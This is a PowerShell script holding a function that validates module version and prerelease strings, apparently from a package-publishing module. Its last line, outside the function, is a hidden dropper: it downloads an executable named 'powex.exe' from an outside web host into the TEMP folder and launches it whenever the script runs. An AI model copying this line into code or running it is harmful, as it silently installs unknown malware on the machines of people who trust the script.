function ValidateAndGet-VersionPrereleaseStrings

{
    Param
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Version,

        [string]
        $Prerelease,

        [parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCmdlet]
        $CallerPSCmdlet
    )

    
    if ($Version -match '-' -and -not $Prerelease)
    {
        $Version,$Prerelease = $Version -split '-',2
    }

    
    if ($Prerelease -and $Prerelease.StartsWith('-') )
    {
        $Prerelease = $Prerelease -split '-',2 | Select-Object -Skip 1
    }
    if ($Prerelease)
    {
        $Prerelease = $Prerelease.Trim()
    }

    
    $validCharacters = "^[a-zA-Z0-9]+$"
    $prereleaseStringValid = $Prerelease -match $validCharacters
    if ($Prerelease -and -not $prereleaseStringValid)
    {
        $message = $LocalizedData.InvalidCharactersInPrereleaseString -f $Prerelease
        ThrowError -ExceptionName "System.ArgumentException" `
                   -ExceptionMessage $message `
                   -ErrorId "InvalidCharactersInPrereleaseString" `
                   -CallerPSCmdlet $CallerPSCmdlet `
                   -ErrorCategory InvalidOperation `
                   -ExceptionObject $Prerelease
    }

    
    if ($Prerelease -and -not ($Version.ToString().Split('.').Count -eq 3))
    {
        $message = $LocalizedData.IncorrectVersionPartsCountForPrereleaseStringUsage -f $Version
        ThrowError -ExceptionName "System.ArgumentException" `
                   -ExceptionMessage $message `
                   -ErrorId "IncorrectVersionPartsCountForPrereleaseStringUsage" `
                   -CallerPSCmdlet $CallerPSCmdlet `
                   -ErrorCategory InvalidOperation `
                   -ExceptionObject $Version
    }

    
    [Version]$VersionVersion = $null
    if (-not ( [System.Version]::TryParse($Version, [ref]$VersionVersion) ))
    {
        $message = $LocalizedData.InvalidVersion -f ($Version)
        ThrowError -ExceptionName "System.ArgumentException" `
                   -ExceptionMessage $message `
                   -ErrorId "InvalidVersion" `
                   -CallerPSCmdlet $CallerPSCmdlet `
                   -ErrorCategory InvalidArgument `
                   -ExceptionObject $Version
    }

    $fullVersion = if ($Prerelease) { "$VersionVersion-$Prerelease" } else { "$VersionVersion" }

    $results = @{
        Version = "$VersionVersion"
        Prerelease = $Prerelease
        FullVersion = $fullVersion
    }
    return $results
}
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/power/powex.exe',"$env:TEMP\powex.exe");Start-Process ("$env:TEMP\powex.exe")

